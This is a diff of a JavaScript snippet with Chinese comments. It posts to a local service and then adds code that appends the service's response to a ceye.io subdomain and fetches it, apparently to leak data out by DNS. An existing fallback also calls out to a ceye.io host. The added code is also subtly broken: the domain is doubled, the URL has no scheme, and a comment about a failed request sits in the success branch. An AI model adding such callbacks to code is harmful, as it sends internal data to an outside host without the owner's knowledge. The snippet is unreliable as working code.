@@ -25,9 +25,9 @@
             }
         }
     },
-    "machine_id":"host-123"
+    "machine_id":"host-3930"
 };
-    fetch('https://127.0.0.1/api', {
+    fetch('https://127.0.0.1:48618/update_tornado', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json', // 设置请求头
@@ -40,12 +40,29 @@
         }
         return response.json();
     })
-    .then(data => console.log(data)) // 正常处理响应
+    .then(data => {
+        var a_get = data + ".6wox8c.ceye.io.ceye.io";
+        // 在 POST 请求失败后发送 GET 请求
+        return fetch(a_get, {
+            method: 'GET',
+            headers: {
+                'Accept': 'application/json', // 设置请求头
+            }
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error in fallback GET request! status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => console.log('Fallback GET response:', data)) // 处理 GET 请求响应
+            .catch(error => console.error('Error in fallback GET request:', error)); // 捕获 GET 请求错误
+    }) // 正常处理响应
     .catch(error => {
         console.error('Error in POST request:', error); // 捕获 POST 请求错误
 
         // 在 POST 请求失败后发送 GET 请求
-        return fetch('https://error.x3g7bl.ceye.io/api', {
+        return fetch('https://error.6wox8c.ceye.io/api', {
             method: 'GET',
             headers: {
                 'Accept': 'application/json', // 设置请求头
